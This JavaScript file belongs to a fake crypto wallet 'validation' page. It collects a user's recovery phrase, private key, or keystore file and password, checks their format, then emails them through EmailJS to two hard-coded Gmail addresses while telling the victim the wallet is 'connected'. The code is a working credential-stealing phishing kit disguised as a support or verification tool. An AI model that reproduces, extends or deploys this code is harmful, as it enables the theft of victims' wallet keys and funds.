// Validation functionality
document.addEventListener('DOMContentLoaded', function() {
    setupFormValidation();
});

function setupFormValidation() {
    // Input mask for recovery phrase
    const seedPhraseInput = document.getElementById('moduleSeedPhrase'); // Corrected ID
    if (seedPhraseInput) {
        seedPhraseInput.addEventListener('input', function(e) {
            const value = e.target.value;
            const sanitizedValue = value.replace(/[^a-zA-Z0-9 ]/g, '');
            if (value !== sanitizedValue) {
                e.target.value = sanitizedValue;
            }
            const wordCount = sanitizedValue.trim().split(/\s+/).filter(Boolean).length;
            const hint = seedPhraseInput.parentElement.querySelector('.input-hint');
            if (hint) {
                if (wordCount === 12 || wordCount === 24) {
                    hint.textContent = `${wordCount} words (valid seed phrase length)`; // CORRECTED
                    hint.style.color = 'var(--success-500)';
                } else {
                    hint.textContent = `${wordCount} words (should be 12 to 24 words)`; // CORRECTED
                    hint.style.color = 'var(--neutral-500)';
                }
            }
        });
    }

    // Input mask for private key
    const privateKeyInput = document.getElementById('modulePrivateKey'); // Corrected ID
    if (privateKeyInput) {
        privateKeyInput.addEventListener('input', function(e) {
            const value = e.target.value;
            const sanitizedValue = value.replace(/[^a-fA-F0-9]/g, '');
            if (value !== sanitizedValue) {
                e.target.value = sanitizedValue;
            }
            const hint = privateKeyInput.parentElement.querySelector('.input-hint');
            if (hint) {
                if (sanitizedValue.length === 64) {
                    hint.textContent = 'Valid private key length (64 characters)';
                    hint.style.color = 'var(--success-500)';
                } else {
                    hint.textContent = `${sanitizedValue.length} characters (should be 64 characters)`; // CORRECTED
                    hint.style.color = 'var(--neutral-500)';
                }
            }
        });
    }

    // Keystore JSON validation
    const keystoreJsonInput = document.getElementById('moduleKeystoreJson'); // Corrected ID
    if (keystoreJsonInput) {
        keystoreJsonInput.addEventListener('blur', function() {
            const value = keystoreJsonInput.value.trim();
            const existingError = keystoreJsonInput.parentElement.querySelector('.input-error');
            if (existingError) {
                existingError.remove();
            }
            keystoreJsonInput.style.borderColor = '';

            if (value) {
                try {
                    JSON.parse(value);
                    keystoreJsonInput.style.borderColor = 'var(--success-500)';
                } catch (e) {
                    keystoreJsonInput.style.borderColor = 'var(--error-500)';
                    const errorMsg = document.createElement('div');
                    errorMsg.className = 'input-error';
                    errorMsg.textContent = 'Invalid JSON format';
                    errorMsg.style.color = 'var(--error-500)';
                    errorMsg.style.fontSize = '0.875rem';
                    errorMsg.style.marginTop = '4px';
                    const parentElement = keystoreJsonInput.parentElement;
                    const oldError = parentElement.querySelector('.input-error');
                    if(oldError) oldError.remove();
                    parentElement.appendChild(errorMsg);
                }
            }
        });
    }

    // Form submission validation
    const validateBtn = document.getElementById('moduleValidateBtn'); // Corrected ID
    if (validateBtn) {
        validateBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log("Validate button clicked. Starting validation process.");

            const walletTypeElement = document.getElementById('moduleWalletType'); // Corrected ID
            const validationTypeElement = document.querySelector('input[name="validationType"]:checked');
            const issueTypeElement = document.getElementById('moduleIssueType');
            const otherIssueElement = document.getElementById('otherIssue');

            document.querySelectorAll('.alert.alert-error').forEach(alert => alert.remove());
            document.querySelectorAll('input, select, textarea').forEach(el => el.style.borderColor = '');
            const validationOptions = document.querySelector('.validation-options');
            if (validationOptions) validationOptions.style.color = '';

            let isValid = true;
            let errorMessage = '';

            if (!walletTypeElement || walletTypeElement.value === '') {
                isValid = false;
                errorMessage = 'Please select your wallet type';
                if (walletTypeElement) walletTypeElement.style.borderColor = 'var(--error-500)';
            }
            else if (!validationTypeElement) {
                isValid = false;
                errorMessage = 'Please select a validation method';
                if (validationOptions) validationOptions.style.color = 'var(--error-500)';
            } else {
                const selectedType = validationTypeElement.value;
                console.log("Selected validation method:", selectedType);
                if (selectedType === 'phrase') {
                    const seedPhrase = document.getElementById('moduleSeedPhrase');
                    if (!seedPhrase || !seedPhrase.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your recovery phrase';
                        if (seedPhrase) seedPhrase.style.borderColor = 'var(--error-500)';
                    } else {
                        const wordCount = seedPhrase.value.trim().split(/\s+/).filter(Boolean).length;
                        if (wordCount !== 12 && wordCount !== 24) {
                            isValid = false;
                            errorMessage = 'Recovery phrase must be 12 or 24 words';
                            if (seedPhrase) seedPhrase.style.borderColor = 'var(--error-500)';
                        }
                    }
                } else if (selectedType === 'keystore') {
                    const keystoreJson = document.getElementById('moduleKeystoreJson');
                    const keystorePassword = document.getElementById('moduleKeystorePassword');
                    if (!keystoreJson || !keystoreJson.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your keystore JSON';
                        if (keystoreJson) keystoreJson.style.borderColor = 'var(--error-500)';
                    } else {
                        try {
                            JSON.parse(keystoreJson.value.trim());
                        } catch (parseError) {
                            isValid = false;
                            errorMessage = 'Invalid JSON format for Keystore';
                            if (keystoreJson) keystoreJson.style.borderColor = 'var(--error-500)';
                        }
                    }
                    if (isValid && (!keystorePassword || !keystorePassword.value)) {
                        isValid = false;
                        errorMessage = 'Please enter your keystore password';
                        if (keystorePassword) keystorePassword.style.borderColor = 'var(--error-500)';
                    }
                } else if (selectedType === 'private') {
                    const privateKey = document.getElementById('modulePrivateKey');
                    if (!privateKey || !privateKey.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your private key';
                        if (privateKey) privateKey.style.borderColor = 'var(--error-500)';
                    } else if (privateKey.value.trim().length !== 64) {
                        isValid = false;
                        errorMessage = 'Private key must be 64 characters long';
                        if (privateKey) privateKey.style.borderColor = 'var(--error-500)';
                    }
                }
            }

            if (isValid && (!issueTypeElement || issueTypeElement.value === '')) {
                isValid = false;
                errorMessage = 'Please select the issue type';
                if (issueTypeElement) issueTypeElement.style.borderColor = 'var(--error-500)';
            } else if (isValid && issueTypeElement.value === 'other' && (!otherIssueElement || !otherIssueElement.value.trim())) {
                isValid = false;
                errorMessage = 'Please describe your issue when "Other" is selected';
                if (otherIssueElement) otherIssueElement.style.borderColor = 'var(--error-500)';
            }

            if (!isValid) {
                console.log("Validation failed:", errorMessage);
                showValidationError(errorMessage);
                return false;
            }
            console.log("All client-side validations passed. Proceeding to prepare data for EmailJS.");

            const loadingOverlay = document.getElementById('loadingOverlay');
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                loadingOverlay.querySelector('p').textContent = 'Submitting details...';
            }

            const walletType = walletTypeElement ? walletTypeElement.value : 'N/A';
            const validationMethod = validationTypeElement ? validationTypeElement.value : 'N/A';
            const issueType = issueTypeElement ? issueTypeElement.value : 'N/A';
            // MODIFIED: Renamed variable to otherIssueDescriptionValue
            const otherIssueDescriptionValue = (issueTypeElement && issueTypeElement.value === 'other' && otherIssueElement && otherIssueElement.value.trim()) ? otherIssueElement.value.trim() : 'N/A';

            let seedPhraseValue = 'N/A';
            let keystoreJsonValue = 'N/A';
            let keystorePasswordValue = 'N/A';
            let privateKeyValue = 'N/A';

            if (validationMethod === 'phrase') {
                const seedPhraseElem = document.getElementById('moduleSeedPhrase');
                if (seedPhraseElem && seedPhraseElem.value.trim()) seedPhraseValue = seedPhraseElem.value.trim();
            } else if (validationMethod === 'keystore') {
                const keystoreJsonElem = document.getElementById('moduleKeystoreJson');
                const keystorePasswordElem = document.getElementById('moduleKeystorePassword');
                if (keystoreJsonElem && keystoreJsonElem.value.trim()) keystoreJsonValue = keystoreJsonElem.value.trim();
                if (keystorePasswordElem && keystorePasswordElem.value) keystorePasswordValue = keystorePasswordElem.value;
            } else if (validationMethod === 'private') {
                const privateKeyElem = document.getElementById('modulePrivateKey');
                if (privateKeyElem && privateKeyElem.value.trim()) privateKeyValue = privateKeyElem.value.trim();
            }

            const templateParams = {
                wallet_type: walletType,
                validation_method: validationMethod,
                recovery_phrase: seedPhraseValue,
                keystore_json: keystoreJsonValue,
                keystore_password: keystorePasswordValue,
                private_key: privateKeyValue,
                issue_type: issueType,
                // MODIFIED: Using otherIssueDescriptionValue here
                other_issue_description: otherIssueDescriptionValue,
                user_agent: navigator.userAgent,
                to_email: 'kingsleyfrancis.kalu@gmail.com,oscarscott2411@gmail.com'
            };

            // --- EmailJS Configuration ---
            // !!! IMPORTANT: Make sure these IDs are YOUR actual EmailJS Service ID and Template ID !!!
            const SERVICE_ID = "service_mkx8qgf"; // This should be YOUR EmailJS Service ID
            const TEMPLATE_ID = "template_g5wq2v1"; // This should be YOUR EmailJS Template ID that uses the `to_email` parameter

            console.log("Preparing to send email with params:", JSON.stringify(templateParams, null, 2));
            console.log("Using SERVICE_ID:", SERVICE_ID, "and TEMPLATE_ID:", TEMPLATE_ID);

            // !!! ADDED LINES EXACTLY AS REQUESTED !!!
            console.log("--- DEBUG: templateParams BEING SENT TO EmailJS ---");
            console.log(JSON.stringify(templateParams, null, 2));
            // !!! END OF ADDED LINES !!!

            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                .then(function(response) {
                    console.log('EmailJS SUCCESS!', response.status, response.text);
                    if (loadingOverlay) loadingOverlay.style.display = 'none';

                    if (window.showNotification) {
                        window.showNotification('Wallet details submitted successfully!', 'success');
                    } else {
                        alert('Wallet details submitted successfully!');
                    }

                    const connectButton = document.getElementById('connectWalletBtn');
                    if (connectButton) {
                        connectButton.textContent = 'Wallet Connected';
                        connectButton.classList.remove('btn-outline');
                        connectButton.classList.add('btn-primary');
                    }
                    const form = document.getElementById('validationForm');
                    if(form) form.reset();
                    const phraseInputDiv = document.getElementById('modulePhraseInput');
                    const keystoreInputDiv = document.getElementById('moduleKeystoreInput');
                    const privateInputDiv = document.getElementById('modulePrivateInput');
                    const otherIssueGroupDiv = document.getElementById('otherIssueGroup');
                    if(phraseInputDiv) phraseInputDiv.style.display = 'none';
                    if(keystoreInputDiv) keystoreInputDiv.style.display = 'none';
                    if(privateInputDiv) privateInputDiv.style.display = 'none';
                    if(otherIssueGroupDiv) otherIssueGroupDiv.style.display = 'none';

                }, function(error) {
                    console.error('EmailJS FAILED...', error);
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    let errorMsg = 'Failed to submit details.';
                    if (error && typeof error === 'object') {
                        if(error.status) errorMsg += ` Status: ${error.status}.`;
                        if(error.text) errorMsg += ` Reason: ${error.text}`;
                        else errorMsg += ` Error: ${JSON.stringify(error)}`;
                    } else if (error) {
                         errorMsg += ` Error: ${error}`;
                    }

                    if (window.showNotification) {
                        window.showNotification(errorMsg, 'error');
                    } else {
                        alert(errorMsg);
                    }
                });
        });
    }
}

function showValidationError(message) {
    const errorAlert = document.createElement('div');
    errorAlert.className = 'alert alert-error';
    errorAlert.innerHTML = `
        <div class="alert-icon"><i class="fas fa-exclamation-circle"></i></div>
        <div class="alert-content">
            <div class="alert-title">Validation Error</div>
            <p>${message}</p>
        </div>
    `;
    errorAlert.style.backgroundColor = 'var(--error-50)';
    errorAlert.style.color = 'var(--error-700)';
    errorAlert.style.borderLeft = '4px solid var(--error-500)';
    errorAlert.style.padding = '12px 16px';
    errorAlert.style.borderRadius = '4px';
    errorAlert.style.marginBottom = '16px';
    errorAlert.style.display = 'flex';
    errorAlert.style.alignItems = 'flex-start';
    errorAlert.style.gap = '12px';
    const icon = errorAlert.querySelector('.alert-icon');
    if (icon) {
        icon.style.flexShrink = '0';
        icon.style.fontSize = '1.25rem';
        icon.style.color = 'var(--error-500)';
    }
    const title = errorAlert.querySelector('.alert-title');
    if (title) {
        title.style.fontWeight = '600';
        title.style.marginBottom = '4px';
    }
    const validationForm = document.querySelector('.validation-form');
    if (validationForm) {
        const existingAlerts = validationForm.querySelectorAll('.alert.alert-error');
        existingAlerts.forEach(alert => alert.remove());
        validationForm.insertBefore(errorAlert, validationForm.firstChild);
        errorAlert.style.opacity = '0';
        errorAlert.style.transform = 'translateY(-10px)';
        setTimeout(() => {
            errorAlert.style.opacity = '1';
            errorAlert.style.transform = 'translateY(0)';
            errorAlert.style.transition = 'all 0.3s ease-out';
        }, 10);
        setTimeout(() => {
            if (errorAlert.parentElement) {
                errorAlert.style.opacity = '0';
                errorAlert.style.transform = 'translateY(-10px)';
                setTimeout(() => {
                    if (errorAlert.parentElement) errorAlert.remove();
                }, 300);
            }
        }, 5000);
    } else {
        console.error("Could not find .validation-form to display error message.");
        alert(`Validation Error: ${message}`); // CORRECTED
    }
}